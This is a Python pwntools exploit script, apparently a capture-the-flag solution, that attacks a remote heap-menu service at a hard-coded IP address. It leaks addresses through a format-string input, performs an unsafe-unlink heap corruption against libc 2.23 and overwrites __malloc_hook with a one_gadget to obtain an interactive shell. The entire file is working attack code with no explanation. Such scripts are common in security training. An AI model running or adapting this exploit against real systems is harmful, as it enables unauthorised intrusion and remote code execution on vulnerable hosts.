from pwn import *

io=remote('39.108.238.37',55555)
libc=ELF('./libc-2.23.so')

def add(inx,size,data):
    io.recvuntil('>> ')
    io.sendline('1')
    io.recvuntil('create (0-10):')
    io.sendline(str(inx))
    io.recvuntil('a size:')
    io.sendline(str(size))
    io.recvuntil('content: ')
    io.send(data)

def free(inx):
    io.recvuntil('>> ')
    io.sendline('2')
    io.recvuntil('index:')
    io.sendline(str(inx))

def edit(inx,data):
    io.recvuntil('>> ')
    io.sendline('4')
    io.recvuntil('index')
    io.sendline(str(inx))
    io.recvuntil('content: ')
    io.send(data)

io.recvuntil('your name: ')
io.sendline("%11$p%15$p")
io.recvuntil('Hello, ')
ret=io.recv(14)
text_base=int(ret[2:],16)-0x001186 
libc_base=int(io.recvline()[2:],16)-0x20830
print(hex(text_base),hex(libc_base))

x=text_base+0x0202080#2
malloc_hook=libc_base+libc.sym['__malloc_hook']
one_gadget=libc_base+0xf1147

add(0,0x88,'a\n')
add(1,0x88,'b\n')
add(2,0x88,'c\n')
add(3,0x88,'d\n')

pl=p64(0)+p64(0x80)+p64(x-0x18)+p64(x-0x10)+'a'*0x60+p64(0x80)+p64(0x90)+'\n'
edit(2,pl)
free(3)

edit(2,p64(0x88)+p64(malloc_hook)+'aa\n') #1
edit(1,p64(one_gadget)+'\n')

io.interactive()